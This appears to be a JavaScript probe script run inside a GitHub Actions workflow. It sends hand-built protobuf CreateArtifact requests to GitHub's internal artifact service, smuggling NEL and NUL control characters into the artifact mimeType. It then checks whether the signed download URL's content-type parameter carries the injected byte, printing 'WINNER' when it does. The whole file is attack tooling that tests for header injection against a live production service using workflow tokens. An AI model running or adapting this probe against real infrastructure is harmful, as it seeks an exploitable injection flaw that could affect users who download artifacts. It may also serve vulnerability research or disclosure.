import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {CreateArtifactResponse} from '../node_modules/@actions/artifact/lib/generated/results/api/v1/artifact.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const runId = process.env.GITHUB_RUN_ID;
const repo = process.env.GITHUB_REPOSITORY;
const token = process.env.GITHUB_TOKEN;

function varint(value) {
  const bytes = [];
  while (value >= 128) {
    bytes.push((value & 127) | 128);
    value = Math.floor(value / 128);
  }
  bytes.push(value);
  return Buffer.from(bytes);
}

function field(number, value) {
  const bytes = Buffer.isBuffer(value) ? value : Buffer.from(value);
  return Buffer.concat([varint(number * 8 + 2), varint(bytes.length), bytes]);
}

function stringValue(value) {
  return field(1, Buffer.from(value));
}

const NEL_MIME = '\u0085application/json';
const CLEAN = 'application/json';

const tests = [
  {
    label: 'v7-single-nel-proto',
    desc: 'v7 with NEL mimeType, single field, protobuf binary',
    body: Buffer.concat([
      field(1, ids.workflowRunBackendId),
      field(2, ids.workflowJobRunBackendId),
      field(3, `test-v7-nel-proto-${runId}`),
      Buffer.from([0x28, 0x07]),
      field(6, stringValue(NEL_MIME)),
    ]),
  },
  {
    label: 'v7-trailing-nel-proto',
    desc: 'v7 with trailing NEL mimeType, single field, protobuf binary',
    body: Buffer.concat([
      field(1, ids.workflowRunBackendId),
      field(2, ids.workflowJobRunBackendId),
      field(3, `test-v7-trail-nel-proto-${runId}`),
      Buffer.from([0x28, 0x07]),
      field(6, stringValue('application/json\u0085')),
    ]),
  },
  {
    label: 'v7-nul-nel-proto',
    desc: 'v7 with NUL+NEL mimeType via protobuf',
    body: Buffer.concat([
      field(1, ids.workflowRunBackendId),
      field(2, ids.workflowJobRunBackendId),
      field(3, `test-v7-nul-nel-proto-${runId}`),
      Buffer.from([0x28, 0x07]),
      field(6, stringValue('application/json\0\u0085')),
    ]),
  },
  {
    label: 'v7-dup-nel-first',
    desc: 'v7 with duplicate: NEL first, clean second',
    body: Buffer.concat([
      field(1, ids.workflowRunBackendId),
      field(2, ids.workflowJobRunBackendId),
      field(3, `test-v7-dup-nel-first-${runId}`),
      Buffer.from([0x28, 0x07]),
      field(6, stringValue(NEL_MIME)),
      field(6, stringValue(CLEAN)),
    ]),
  },
  {
    label: 'v7-dup-nel-second',
    desc: 'v7 with duplicate: clean first, NEL second',
    body: Buffer.concat([
      field(1, ids.workflowRunBackendId),
      field(2, ids.workflowJobRunBackendId),
      field(3, `test-v7-dup-nel-second-${runId}`),
      Buffer.from([0x28, 0x07]),
      field(6, stringValue(CLEAN)),
      field(6, stringValue(NEL_MIME)),
    ]),
  },
  {
    label: 'v7-raw-string-no-wrapper',
    desc: 'v7 with mimeType as raw string (no StringValue wrapper)',
    body: Buffer.concat([
      field(1, ids.workflowRunBackendId),
      field(2, ids.workflowJobRunBackendId),
      field(3, `test-v7-raw-str-${runId}`),
      Buffer.from([0x28, 0x07]),
      field(6, Buffer.from(NEL_MIME)),
    ]),
  },
  {
    label: 'v7-dup-raw-then-wrapped',
    desc: 'v7 with first raw NEL (no wrapper), then wrapped clean',
    body: Buffer.concat([
      field(1, ids.workflowRunBackendId),
      field(2, ids.workflowJobRunBackendId),
      field(3, `test-v7-raw-then-wrap-${runId}`),
      Buffer.from([0x28, 0x07]),
      field(6, Buffer.from(NEL_MIME)),
      field(6, stringValue(CLEAN)),
    ]),
  },
];

const createUrl = new URL(
  '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
  process.env.ACTIONS_RESULTS_URL,
);

const client = internalArtifactTwirpClient({maxAttempts: 1});
const placeholder = Buffer.from('{}');
const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;

for (const test of tests) {
  console.log(`\n=== ${test.label}: ${test.desc} ===`);
  console.log(`Body hex: ${test.body.toString('hex')}`);
  try {
    const resp = await fetch(createUrl, {
      method: 'POST',
      headers: {
        authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
        'content-type': 'application/protobuf',
      },
      body: test.body,
    });
    const bytes = new Uint8Array(await resp.arrayBuffer());
    if (!resp.ok) {
      console.log(`REJECTED: HTTP ${resp.status} - ${Buffer.from(bytes).toString('utf8').slice(0, 200)}`);
      continue;
    }
    const created = CreateArtifactResponse.fromBinary(bytes);
    if (!created.ok || !created.signedUploadUrl) {
      console.log('FAIL: no upload URL');
      continue;
    }
    console.log('CREATE OK');

    const blob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();
    await blob.uploadData(placeholder, {blobHTTPHeaders: {blobContentType: CLEAN}});

    const finalized = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name: test.body.toString().match(/test-[a-z0-9-]+-\d+/)?.[0] || `unknown-${Date.now()}`,
      size: String(placeholder.length),
      hash: StringValue.create({value: hash}),
    });
    if (!finalized.ok) {
      console.log('FINALIZE FAIL');
      continue;
    }
    const id = String(finalized.artifactId);
    console.log(`FINALIZED: ID ${id}`);

    const endpoint = `https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`;
    const check = await fetch(endpoint, {
      redirect: 'manual',
      headers: {
        accept: 'application/vnd.github.v3+json',
        authorization: `Bearer ${token}`,
        'user-agent': 'proto-single-test',
      },
    });
    const location = check.headers.get('location');
    if (location) {
      const url = new URL(location);
      const rsct = url.searchParams.get('rsct') || 'absent';
      const rsctHex = Buffer.from(rsct, 'utf8').toString('hex');
      const hasNEL = rsct.includes('\u0085');
      console.log(`RSCT: ${rsct} (hex: ${rsctHex}) NEL: ${hasNEL}`);
      if (hasNEL) console.log('!!! WINNER !!!');
    } else {
      console.log(`NO REDIRECT: HTTP ${check.status}`);
    }
  } catch (err) {
    console.log(`ERROR: ${String(err).slice(0, 200)}`);
  }
}
